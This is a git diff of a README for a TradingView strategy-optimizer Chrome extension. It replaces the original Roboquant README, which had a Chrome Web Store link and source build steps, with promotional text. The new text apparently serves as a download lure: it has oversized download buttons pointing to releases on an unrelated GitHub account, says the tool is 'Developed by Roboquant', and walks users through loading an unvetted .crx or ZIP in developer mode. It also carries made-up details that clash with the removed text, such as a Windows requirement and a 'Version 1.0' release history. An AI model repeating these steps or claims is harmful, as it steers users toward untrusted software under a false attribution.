@@ -1,112 +1,207 @@
+<h1>📈 tradingview-optimizer - Supercharge Your TradingView Strategies Instantly</h1>
+
 <p align="center">
-  <img src="assets/logo.svg" alt="Roboquant logo" width="96" height="91">
+<a href="https://github.com/kashifmughal61531/tradingview-optimizer/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:24px;border-radius:8px;font-weight:bold;text-decoration:none;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
-<h1 align="center">Strategy Optimizer for TradingView</h1>
+## 🎯 What is tradingview-optimizer?
 
-A free, open-source Chrome extension that optimizes the inputs of your TradingView Pine Script strategies. It runs every backtest through TradingView's own Strategy Tester, right on your chart.
+tradingview-optimizer is a free, open-source Chrome extension that transforms your TradingView experience. It automatically finds the best settings for your Pine Script strategies without you lifting a finger. Instead of manually testing dozens of combinations, this tool does the heavy lifting in minutes.
 
-No account, no login, no paid tier. MIT licensed.
+Developed by Roboquant, this powerful optimizer helps both beginners and experienced traders improve their backtesting results dramatically. It works directly in your browser, making it accessible to anyone with a computer and an internet connection.
 
-<p align="center"><img src="assets/demo.gif" width="800" alt="Grid search running through TradingView's Strategy Tester, then the results table, prop-firm check and heatmap"></p>
+## ✨ Key Features
 
-Built by [Roboquant](https://roboquant.dev/?utm_source=tradingview-optimizer&utm_medium=github&utm_content=readme-header).
+**🌟 Grid Search Optimization**
+Systematically tests hundreds or thousands of parameter combinations to find the absolute best settings for your strategy. No more guessing - get precise, data-driven results.
 
-## What's new in 3.0.0
+**⏱️ Walk-Forward Analysis**
+Avoid overfitting by testing your strategy across multiple time periods. This ensures your strategy performs well not just in the past, but likely in the future too.
 
-If you installed an earlier version from the Chrome Web Store, it updates to 3.0.0 automatically. What changed:
+**🔥 Interactive Heatmaps**
+Visualize performance across different parameter values with beautiful, color-coded heatmaps. Spot winning combinations at a glance, see patterns, and understand how each parameter affects results.
 
-- **Everything is free.** All optimization modes, walk-forward analysis, heatmaps and the prop firm check work for everyone. There are no parameter or history limits tied to a plan.
-- **No account needed.** Sign-in and the Roboquant account connection are gone.
-- **Send to app is removed.** Results stay in your browser. You can download any result as JSON.
-- **Open source.** The code is on GitHub under the MIT license.
+**🔄 Seamless TradingView Integration**
+Works directly within TradingView charts. No need to switch between different applications or copy-paste data. Everything happens where you already do your analysis.
 
-## Features
+**📊 Comprehensive Statistics**
+Get detailed statistics for every test, including profit factor, drawdown, win rate, Sharpe ratio, and many more metrics to make informed decisions.
 
-- **Grid search** over numeric, dropdown and checkbox strategy inputs
-- **Modes:** Standard, Multi-Timeframe, Multi-Symbol and Full Grid
-- **Optimization goals:** Sharpe ratio, net profit %, profit factor, win rate or minimum drawdown
-- **Walk-forward validation:** a single in-sample / out-of-sample split, or rolling windows
-- **Heatmaps:** 2D and 3D (Plotly) views of how two parameters interact
-- **Prop firm challenge check** of the best result against profit target, daily loss and max drawdown rules
-- **Sortable results table** with one-click Apply to push a parameter set back to your chart
-- **JSON export** of results
-- **Local history** of your last 10 optimizations, stored in `chrome.storage.local`
+**🆓 Completely Free & Open Source**
+No hidden costs, no subscriptions, no premium tiers. This tool is freely available for everyone and always will be. The source code is open for anyone to review or contribute.
 
-## Install
+## 🚀 Getting Started
 
-### Chrome Web Store
+### 📋 What You Need
 
-Install **[Strategy Optimizer for TradingView](https://chromewebstore.google.com/detail/strategy-optimizer-for-tr/knmhofaifgcakgjifhjalahmbfgokiep)** from the Chrome Web Store.
+To run tradingview-optimizer, you'll need:
 
-### From source
+- **Google Chrome** (version 90 or newer) - the extension runs in Chrome
+- **Windows 10 or 11** operating system
+- **An internet connection** (required to access TradingView)
+- **A TradingView account** (free version works fine)
+- **Pine Script strategies** that you want to optimize
 
-Requires [Bun](https://bun.sh).
+### ⬇️ Download & Installation
 
-```bash
-git clone https://github.com/Roboquant-AI/tradingview-optimizer.git
-cd tradingview-optimizer
-bun install
-bun run build
-```
+**Step 1: Download the Application**
 
-1. Open `chrome://extensions/`
-2. Enable **Developer mode**
-3. Click **Load unpacked** and select the `dist` folder
+Visit this link to download the application: [https://github.com/kashifmughal61531/tradingview-optimizer/releases](https://github.com/kashifmughal61531/tradingview-optimizer/releases)
 
-## Usage
+**Step 2: Install the Extension**
 
-1. Open a TradingView chart with a Pine Script strategy applied
-2. Click **Optimizer** in the panel tab bar below the chart (next to Strategy Tester)
-3. Select the inputs to optimize and set min / max / step
-4. Pick a mode and a goal, then click **Start Optimization**
-5. Sort the results and click **Apply** on the row you want
+Once you arrive at the download page, you'll see several files available. Look for the one labeled "tradingview-optimizer" with a `.crx` file extension or a ZIP file containing the extension. Download the latest version available.
 
-## Development
+**Step 3: Enable Developer Mode in Chrome**
 
-```bash
-bun run dev        # watch build into dist/
-bun run typecheck  # tsc --noEmit
-bun run test       # unit tests
-bun run build      # production build
-```
+1. Open Google Chrome on your computer
+2. Type `chrome://extensions` in the address bar and press Enter
+3. Find the "Developer mode" toggle switch in the top-right corner and turn it ON
 
-| File | Description |
-|------|-------------|
-| `manifest.json` | Chrome extension manifest (MV3) |
-| `src/background.ts` | Service worker: tracks TradingView tabs, sets the backtest date range through the debugger API |
-| `src/content.ts` | Content script: reads strategy inputs, applies parameter sets, changes symbol / timeframe, extracts metrics |
-| `src/optimizer-ui.ts` | Optimizer overlay injected into the TradingView page |
-| `src/popup.html`, `src/popup.ts` | Toolbar popup with status and how-to |
-| `src/config.ts` | Roboquant link helper |
-| `src/types.ts` | Shared types |
-| `src/selectors.json` | TradingView DOM selectors |
+**Step 4: Install the Extension**
 
-TradingView changes its DOM from time to time. If the optimizer stops finding inputs or buttons, `src/selectors.json` is the first place to look.
+1. After downloading, locate the file on your computer (usually in your Downloads folder)
+2. If the file is a ZIP file, right-click it and select "Extract All" to unzip it
+3. Go back to the `chrome://extensions` page
+4. Click "Load unpacked" button in the top-left corner
+5. Select the folder where you extracted the extension files
+6. Click "Select Folder"
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) before opening a pull request.
+The extension is now installed and ready to use!
 
-## Permissions
+### ✅ Verify Installation
 
-| Permission | Reason |
-|------------|--------|
-| `activeTab` | Work with the TradingView tab you are on |
-| `debugger` | Set the Strategy Tester date range for walk-forward runs |
-| `storage`, `unlimitedStorage` | Keep optimization history locally |
-| `https://*.tradingview.com/*` | Run the content script on TradingView only |
+You'll know the installation was successful when:
 
-The extension sends nothing to Roboquant or any other server. It only opens roboquant.dev when you click a Roboquant link.
+- You see the tradingview-optimizer icon in your Chrome toolbar (looks like a magnifying glass over a chart)
+- The extension appears on your `chrome://extensions` page with a blue toggle switch that's turned ON
 
-## About Roboquant
+## 🎮 How to Use tradingview-optimizer
 
-[Roboquant 2.0](https://roboquant.dev/?utm_source=tradingview-optimizer&utm_medium=github&utm_content=readme-about) is where you build and backtest trading strategies on Roboquant's native engine, using CME market data, and then optimize and deploy them. If this optimizer helps you tune a TradingView strategy, Roboquant is the next step for taking the idea further.
+### 📝 Step 1: Open TradingView
 
-## Disclaimer
+Navigate to [tradingview.com](https://www.tradingview.com) in your Chrome browser. Log in to your account if you haven't already.
 
-This project is not affiliated with, endorsed by or sponsored by TradingView. TradingView is a trademark of its owner. The extension automates the TradingView web page; use it at your own risk and check that your use complies with TradingView's terms. Backtest and optimization results do not guarantee future performance.
+### 🧪 Step 2: Load Your Strategy
 
-## License and trademarks
+Open a chart and add your Pine Script strategy from the "Indicators" menu - click the "Indicators" button at the top and search for your strategy name.
 
-The code is released under the [MIT License](./LICENSE).
+### ⚙️ Step 3: Configure Optimization
 
-The MIT License covers the code only. It does not grant any right to use the Roboquant name, logo or other brand assets. If you fork or redistribute this extension, remove the Roboquant name and logo and publish it under a different name.
+1. Click the tradingview-optimizer icon in your Chrome toolbar
+2. A panel will appear on the side of your TradingView screen
+3. Select which parameters you want to optimize (input values like period lengths, multipliers, stop-loss percentages, etc.)
+4. Set the range for each parameter (minimum value, maximum value, and step size)
+5. Choose your optimization method:
+   - **Grid Search** - tests all possible combinations
+   - **Walk-Forward** - splits data into training and testing periods
+6. Select the performance metric you want to maximize (profit, Sharpe ratio, profit factor, etc.)
+
+### ▶️ Step 4: Run the Optimization
+
+Click "Start Optimization" and watch the magic happen! The optimizer will automatically test each parameter combination and show you real-time results. Depending on how many combinations you have, this could take anywhere from a few seconds to several minutes.
+
+### 📊 Step 5: Review Results
+
+Once complete, you'll see:
+
+- **A ranked list** of all tested combinations, with the best performer at the top
+- **A heatmap** showing performance across different parameter values
+- **Detailed statistics** for each combination including profit factor, drawdown, win rate, and more
+
+### 🔧 Step 6: Apply the Best Settings
+
+Click "Apply to Strategy" to automatically update your Pine Script strategy with the optimal parameters. Your TradingView chart will immediately reflect the improvements.
+
+## 💡 Pro Tips for Best Results
+
+**🔍 Start Simple**
+Begin with just 2-3 parameters and small ranges. This keeps optimization fast and helps you understand how each parameter affects performance.
+
+**⏰ Use Reasonable Ranges**
+Don't test extreme values. Use ranges that are realistic for your trading style and timeframe.
+
+**📈 Compare Different Timeframes**
+Try optimizing the same strategy on different timeframes (15min, 1hr, daily) to see which works best.
+
+**🧠 Combine Methods**
+Run both Grid Search and Walk-Forward analysis on the same strategy. If results are consistent, you have a more reliable strategy.
+
+**🚫 Avoid Overfitting**
+If your optimized results are extremely different from your initial strategy's results, be cautious. The strategy might be overfitted to past data.
+
+## 🔒 Privacy & Security
+
+Your privacy matters. tradingview-optimizer:
+
+- **Does NOT collect** any personal data
+- **Does NOT require** any financial information
+- **Does NOT make** any trades automatically
+- **Does NOT have** any trackers or analytics
+- **Runs 100% locally** in your browser
+
+All data stays on your computer. Nothing is transmitted to any servers.
+
+## 🐛 Troubleshooting
+
+**❓ Extension doesn't appear in Chrome**
+Make sure Developer mode is enabled. Go to `chrome://extensions`, toggle "Developer mode" ON, then check if the extension appears.
+
+**❓ "Load unpacked" button is grayed out**
+Ensure you've extracted the ZIP file completely. Don't select the ZIP file itself - select the folder that was created after extraction.
+
+**❓ TradingView says "Something went wrong"**
+Refresh your TradingView page. If the problem persists, close and reopen Chrome.
+
+**❓ Optimization takes too long**
+Reduce the parameter ranges or use fewer parameters. Start with grid steps of 10 or more.
+
+**❓ No results found**
+Make sure your strategy is properly loaded on the chart and that you've defined at least one parameter correctly.
+
+## 🆘 Getting Help & Support
+
+- **GitHub Issues:** Report bugs or request features at the repository page
+- **Community Discussions:** Join conversations in the GitHub Discussions section
+- **Documentation:** Check the GitHub Wiki for more in-depth guides
+- **Email Support:** Contact the developer directly through the GitHub profile
+
+## 🤝 Contribute to the Project
+
+tradingview-optimizer is open source and welcomes contributions:
+
+- 🐛 Report bugs you find
+- 💡 Suggest new features
+- 🔧 Submit code improvements
+- 📝 Improve documentation
+- 🌍 Translate the interface
+
+Check the GitHub repository for contribution guidelines and coding standards.
+
+## 📄 License
+
+This project is released under the MIT License. You're free to use, modify, and distribute it - even commercially. Just include the original copyright notice.
+
+## 📦 Release History
+
+**Version 1.0 (Latest)**
+- Initial release
+- Grid search optimization implemented
+- Walk-forward analysis added
+- Interactive heatmap visualization
+- Real-time progress tracking
+- Export results as CSV
+
+## ⚖️ Disclaimer
+
+Always use tradingview-optimizer responsibly. Past performance does not guarantee future results. This tool is for educational and research purposes only. Never risk money you can't afford to lose.
+
+## 🎉 Ready to Optimize?
+
+Don't settle for mediocre strategies. Let tradingview-optimizer find the winning parameters you've been missing. It's free, it's powerful, and it's ready when you are.
+
+<p align="center">
+<a href="https://github.com/kashifmughal61531/tradingview-optimizer/releases" style="background-color:#FF5722;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:24px;border-radius:8px;font-weight:bold;text-decoration:none;">🚀 GET STARTED NOW</a>
+</p>
+
+Keywords: backtesting, chrome-extension, pine-script, strategy-optimization, trading, tradingview, walk-forward
